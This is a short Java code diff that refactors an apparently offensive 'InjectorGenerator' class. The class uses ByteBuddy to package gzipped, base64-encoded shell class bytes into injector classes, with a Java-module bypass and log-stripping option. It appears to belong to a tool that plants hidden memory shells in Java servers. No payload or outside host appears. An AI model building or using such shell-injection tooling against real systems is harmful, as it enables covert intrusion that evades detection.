@@ -21,9 +21,16 @@ import static net.bytebuddy.matcher.ElementMatchers.named;
  * @since 2024/11/24
  */
 public class InjectorGenerator {
+    private final ShellConfig config;
+    private final InjectorConfig injectorConfig;
+
+    public InjectorGenerator(ShellConfig config, InjectorConfig injectorConfig) {
+        this.config = config;
+        this.injectorConfig = injectorConfig;
+    }
 
     @SneakyThrows
-    public static byte[] generate(ShellConfig config, InjectorConfig injectorConfig) {
+    public DynamicType.Builder<?> getBuilder() {
         String base64String = Base64.encodeBase64String(
                         CommonUtil.gzipCompress(injectorConfig.getShellClassBytes()))
                 .replace(System.lineSeparator(), "");
@@ -35,6 +42,7 @@ public class InjectorGenerator {
                 .method(named("getBase64String")).intercept(FixedValue.value(base64String))
                 .method(named("getClassName")).intercept(FixedValue.value(injectorConfig.getShellClassName()));
 
+
         if (config.needByPassJavaModule()) {
             builder = ByPassJavaModuleInterceptor.extend(builder);
         }
@@ -42,7 +50,12 @@ public class InjectorGenerator {
         if (config.isDebugOff()) {
             builder = LogRemoveMethodVisitor.extend(builder);
         }
+        return builder;
+    }
 
+    @SneakyThrows
+    public byte[] generate() {
+        DynamicType.Builder<?> builder = getBuilder();
         try (DynamicType.Unloaded<?> make = builder.make()) {
             return make.getBytes();
         }
